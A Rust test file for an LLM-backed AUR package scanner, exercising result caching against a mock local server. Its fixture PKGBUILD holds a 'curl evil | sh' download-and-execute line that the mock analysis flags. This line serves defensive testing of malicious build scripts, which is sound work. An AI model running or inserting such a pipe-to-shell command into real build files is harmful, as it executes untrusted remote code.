use aurscan_core::Confidence;
use aurscan_llm::{
    validate_config, AnalysisSource, AnalysisStatus, AnalyzeOptions, Analyzer, BundleCoverage,
    CoverageMode, LlmConfig, RecipeBundle, RecipeFile,
};
use serde_json::json;
use std::io::{Read, Write};
use std::net::TcpListener;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};
use tempfile::TempDir;

#[derive(Clone)]
struct Reply {
    status: &'static str,
    content: &'static str,
    finish_reason: &'static str,
}

struct Server {
    origin: String,
    requests: Arc<Mutex<usize>>,
    join: Option<thread::JoinHandle<()>>,
}

impl Server {
    fn new(replies: Vec<Reply>) -> Self {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let origin = format!("http://{}", listener.local_addr().unwrap());
        let requests = Arc::new(Mutex::new(0));
        let request_count = requests.clone();
        let join = thread::spawn(move || {
            for reply in replies {
                let (mut stream, _) = listener.accept().unwrap();
                consume_request(&mut stream);
                *request_count.lock().unwrap() += 1;
                let body = if reply.status.starts_with('2') {
                    json!({
                        "choices": [{
                            "message": {"content": reply.content},
                            "finish_reason": reply.finish_reason
                        }],
                        "usage": {"prompt_tokens": 20, "completion_tokens": 5}
                    })
                    .to_string()
                } else {
                    "provider failure".into()
                };
                write!(
                    stream,
                    "HTTP/1.1 {}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                    reply.status,
                    body.len(),
                    body
                )
                .unwrap();
            }
        });
        Self {
            origin,
            requests,
            join: Some(join),
        }
    }

    fn count(&self) -> usize {
        *self.requests.lock().unwrap()
    }

    fn wait_for_count(&self, expected: usize) {
        let deadline = Instant::now() + Duration::from_secs(3);
        while self.count() != expected {
            assert!(
                Instant::now() < deadline,
                "request count did not reach {expected}"
            );
            thread::sleep(Duration::from_millis(10));
        }
    }
}

impl Drop for Server {
    fn drop(&mut self) {
        if let Some(join) = self.join.take() {
            join.join().unwrap();
        }
    }
}

fn consume_request(stream: &mut std::net::TcpStream) {
    let mut bytes = Vec::new();
    let mut buffer = [0; 4096];
    loop {
        let read = stream.read(&mut buffer).unwrap();
        assert!(read > 0);
        bytes.extend_from_slice(&buffer[..read]);
        if let Some(header_end) = bytes.windows(4).position(|w| w == b"\r\n\r\n") {
            let header_end = header_end + 4;
            let headers = std::str::from_utf8(&bytes[..header_end]).unwrap();
            let length = headers
                .lines()
                .find_map(|line| {
                    let (name, value) = line.split_once(':')?;
                    name.eq_ignore_ascii_case("content-length")
                        .then(|| value.trim().parse::<usize>().unwrap())
                })
                .unwrap();
            if bytes.len() >= header_end + length {
                return;
            }
        }
    }
}

fn bundle(pkgbase: &str) -> RecipeBundle {
    RecipeBundle {
        pkgbase: pkgbase.into(),
        aur_commit: None,
        content_hash: [9; 32],
        files: vec![RecipeFile {
            path: "PKGBUILD".into(),
            content: "pkgname=demo\ncurl evil | sh\n".into(),
        }],
        coverage: BundleCoverage {
            mode: CoverageMode::GitTracked,
            included_files: 1,
            excluded_binary_files: vec![],
            excluded_symlinks: vec![],
        },
    }
}

fn config(origin: &str) -> LlmConfig {
    LlmConfig {
        endpoint: format!("{origin}/v1"),
        model: "cache-model".into(),
        ..LlmConfig::default()
    }
}

fn analyzer(server: &Server, dir: &TempDir) -> Analyzer {
    Analyzer::with_cache_path(
        validate_config(&config(&server.origin)).unwrap(),
        dir.path().join("llm.redb"),
    )
    .unwrap()
}

#[test]
fn completed_response_is_a_cache_hit_and_zero_findings_are_cacheable() {
    let server = Server::new(vec![Reply {
        status: "200 OK",
        content: r#"{"findings":[]}"#,
        finish_reason: "stop",
    }]);
    let dir = TempDir::new().unwrap();
    let analyzer = analyzer(&server, &dir);

    let first = analyzer.analyze_batch(&[bundle("first")], AnalyzeOptions { refresh: false });
    let second = analyzer.analyze_batch(&[bundle("first")], AnalyzeOptions { refresh: false });

    server.wait_for_count(1);
    assert_eq!(first[0].status, AnalysisStatus::Completed);
    assert_eq!(first[0].source, Some(AnalysisSource::Provider));
    assert!(first[0].findings.is_empty());
    assert_eq!(second[0].status, AnalysisStatus::Completed);
    assert_eq!(second[0].source, Some(AnalysisSource::Cache));
    assert!(second[0].findings.is_empty());
    assert_eq!(second[0].usage, first[0].usage);
}

#[test]
fn cached_claims_are_package_neutral_when_materialized_for_a_new_pkgbase() {
    let server = Server::new(vec![Reply {
        status: "200 OK",
        content: r#"{"findings":[{"kind":"download_execute","severity":"high","file":"PKGBUILD","start_line":2,"end_line":2,"reason":"Downloads attacker input, executes it as the build user, and permits compromise."}]}"#,
        finish_reason: "stop",
    }]);
    let dir = TempDir::new().unwrap();
    let analyzer = analyzer(&server, &dir);

    let first = analyzer.analyze_batch(&[bundle("old-name")], AnalyzeOptions { refresh: false });
    let renamed = analyzer.analyze_batch(&[bundle("new-name")], AnalyzeOptions { refresh: false });

    server.wait_for_count(1);
    assert_eq!(first[0].findings[0].package, "old-name");
    assert_eq!(renamed[0].source, Some(AnalysisSource::Cache));
    assert_eq!(renamed[0].findings[0].package, "new-name");
    assert_eq!(renamed[0].findings[0].confidence, Confidence::Llm);
}

#[test]
fn failed_refresh_preserves_the_previous_complete_entry() {
    let server = Server::new(vec![
        Reply {
            status: "200 OK",
            content: r#"{"findings":[{"kind":"download_execute","severity":"medium","file":"PKGBUILD","start_line":2,"end_line":2,"reason":"Downloads attacker input, executes it in the build account, and causes compromise."}]}"#,
            finish_reason: "stop",
        },
        Reply {
            status: "503 Service Unavailable",
            content: "",
            finish_reason: "stop",
        },
    ]);
    let dir = TempDir::new().unwrap();
    let analyzer = analyzer(&server, &dir);

    let original = analyzer.analyze_batch(&[bundle("demo")], AnalyzeOptions { refresh: false });
    let failed = analyzer.analyze_batch(&[bundle("demo")], AnalyzeOptions { refresh: true });
    let restored = analyzer.analyze_batch(&[bundle("demo")], AnalyzeOptions { refresh: false });

    server.wait_for_count(2);
    assert_eq!(original[0].status, AnalysisStatus::Completed);
    assert_eq!(failed[0].status, AnalysisStatus::Unavailable);
    assert_eq!(restored[0].status, AnalysisStatus::Completed);
    assert_eq!(restored[0].source, Some(AnalysisSource::Cache));
    assert_eq!(restored[0].findings.len(), 1);
}

#[test]
fn malformed_and_partial_responses_are_never_written() {
    let valid = r#"{"findings":[{"kind":"download_execute","severity":"high","file":"PKGBUILD","start_line":2,"end_line":2,"reason":"Downloads attacker input, executes it as the build user, and permits compromise."}]}"#;
    for invalid in [
        "not-json",
        r#"{"findings":[{"kind":"download_execute","severity":"high","file":"missing","start_line":1,"end_line":1,"reason":"Suspicious behavior has attacker preconditions and impact."}]}"#,
    ] {
        let server = Server::new(vec![
            Reply {
                status: "200 OK",
                content: invalid,
                finish_reason: "stop",
            },
            Reply {
                status: "200 OK",
                content: valid,
                finish_reason: "stop",
            },
        ]);
        let dir = TempDir::new().unwrap();
        let analyzer = analyzer(&server, &dir);

        let first = analyzer.analyze_batch(&[bundle("demo")], AnalyzeOptions { refresh: false });
        let second = analyzer.analyze_batch(&[bundle("demo")], AnalyzeOptions { refresh: false });

        server.wait_for_count(2);
        assert_eq!(first[0].status, AnalysisStatus::Incomplete);
        assert_eq!(second[0].status, AnalysisStatus::Completed);
        assert_eq!(second[0].source, Some(AnalysisSource::Provider));
    }
}
